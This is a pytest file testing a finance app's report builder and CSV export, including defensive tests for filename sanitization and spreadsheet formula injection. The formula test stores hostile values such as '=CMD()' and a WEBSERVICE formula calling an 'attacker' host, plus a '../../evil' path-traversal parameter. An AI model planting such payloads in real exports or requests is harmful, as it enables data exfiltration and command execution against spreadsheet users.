from __future__ import annotations

from app.extensions import db
from app.models import Transaction, User
from app.utils.enums import RevenueStatus, TransactionType
from app.reports.services import build_report
from app.utils.types import TransactionFilters


def test_report_metrics_calculate_correctly(app, sample_data):
    with app.app_context():
        admin = db.session.get(User, sample_data["admin_id"])
        report = build_report(admin, "cash_flow_monthly", TransactionFilters())
        assert report["metric_total"] == 1000.0


def test_csv_export_works(client, sample_data, login):
    login("admin@example.com", "AdminPassword123")
    response = client.get("/reports/export/csv?report=expense_monthly")
    assert response.status_code == 200
    assert response.mimetype.startswith("text/csv")
    assert b"label,value" in response.data


def test_reports_page_renders(client, sample_data, login):
    login("admin@example.com", "AdminPassword123")
    response = client.get("/reports")
    assert response.status_code == 200
    assert b"Reports" in response.data


def test_report_export_filename_is_sanitized(client, sample_data, login):
    login("admin@example.com", "AdminPassword123")
    response = client.get("/reports/export/csv?report=../../evil")
    assert response.status_code == 200
    assert response.headers["Content-Disposition"] == "attachment; filename=transactions.csv"


def test_report_csv_export_sanitizes_formula_cells(client, app, sample_data, login):
    with app.app_context():
        item = Transaction(
            transaction_type=TransactionType.REVENUE.value,
            title="=CMD()",
            counterparty="=WEBSERVICE(\"https://attacker\")",
            category_id=sample_data["revenue_category_id"],
            account_id=sample_data["account_id"],
            amount=10,
            expected_amount=10,
            received_amount=10,
            transaction_date=db.session.get(Transaction, sample_data["revenue_id"]).transaction_date,
            status=RevenueStatus.RECEIVED.value,
            submitted_by_id=sample_data["admin_id"],
        )
        db.session.add(item)
        db.session.commit()

    login("admin@example.com", "AdminPassword123")
    response = client.get("/reports/export/csv?report=revenue_source")
    assert response.status_code == 200
    assert b"'=WEBSERVICE" in response.data


def test_report_build_enforces_row_limit(app, sample_data):
    app.config["MAX_EXPORT_ROWS"] = 0
    with app.app_context():
        admin = db.session.get(User, sample_data["admin_id"])
        assert admin is not None
        try:
            build_report(admin, "cash_flow_monthly", TransactionFilters())
        except ValueError as exc:
            assert "maximum allowed size" in str(exc)
        else:
            raise AssertionError("Expected report row limit to be enforced.")
